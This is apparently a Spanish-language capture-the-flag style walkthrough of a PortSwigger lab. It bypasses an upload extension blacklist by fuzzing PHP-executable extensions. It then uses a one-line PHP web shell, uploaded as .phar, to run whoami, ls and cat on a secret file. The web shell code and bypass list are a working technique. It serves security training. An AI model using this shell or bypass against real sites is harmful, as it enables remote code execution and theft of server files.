---
title: File Upload Vulnerabilities Lab 4
date: 2024-11-25 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - File Upload Vulnerabilities
tags:
  - File Upload Vulnerabilities
  - Web shell upload via extension blacklist bypass
image:
  path: /assets/img/File-Upload-Vulnerabilities-Lab-4/Portswigger.png
---

## Skills

- Web shell upload via extension blacklist bypass

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `función` de carga de imágenes `vulnerable`, ciertas `extensiones` de `archivo` están `blacklisteadas`, pero esta defensa puede ser eludida debido a una falla fundamental en la `configuración` de esta `blacklist`. Para resolver el laboratorio, debemos subir una web shell básica en `PHP`, utilizarla para `extraer` el `contenido` del archivo `/home/carlos/secret` y enviar este secreto utilizando el botón proporcionado en la barra del laboratorio. Podemos `iniciar sesión` con nuestra propia cuenta utilizando las siguientes credenciales: `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_1.png)

Pulsamos en `My account` e `iniciamos sesión` con las credenciales `wiener:peter`

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_2.png)

Vemos que existe un `campo` de `subida` de `archivos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_3.png)

Si `inspeccionamos` con `donde` se `aloja` la `imagen` vemos que es en la ruta `/resources/images`

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_4.png)

Nos creamos un archivo llamado `shell.php` y lo `subimos`

```
<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Al subir el archivo nos sale un error

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_5.png)

Subimos el archivo nuevamente y capturamos la petición con Burpsuite

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_6.png)

En Hacktricks hay una lista de extensiones que pueden interpretar código php [https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology), nos creamos una lista con estas extensiones

```
# cat extensions.txt 
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.phps
.php
.phtm
.phtml
.pgif
.shtml
.htaccess
.phar
.inc
.hphp
.ctp
.module
```

Mandamos la petición al intruder de Burpsuite y seleccionamos la extensión

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_7.png)

Nos vamos a Payloads, pulsamos en Load, cargamos la lista de extensiones, en la parte inferior de esta ventana desmarcamos el `Payload encoding` y pulsamos en Start attack

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_8.png)

Abrimos nuevamente el `inspector` de `chrome` y vemos que el archivo subido se aloja en `/files/avatars`

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_9.png)

Desde el repeater de Burpsuite he ido mandando los payloads manualmente hasta que he dado con el .phar el cual si me ha interpretado `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=whoami`, he tenido que hacerlo de esta forma porque los archivos subidos se van eliminando

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_10.png)

`Listamos` el `contenido` de la `home` de carlos `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=ls%20/home/carlos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_11.png)

Obtenemos el contenido del archivo secret `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=cat%20/home/carlos/secret`

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_12.png)

`Submiteamos` la `solución`

![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_13.png)
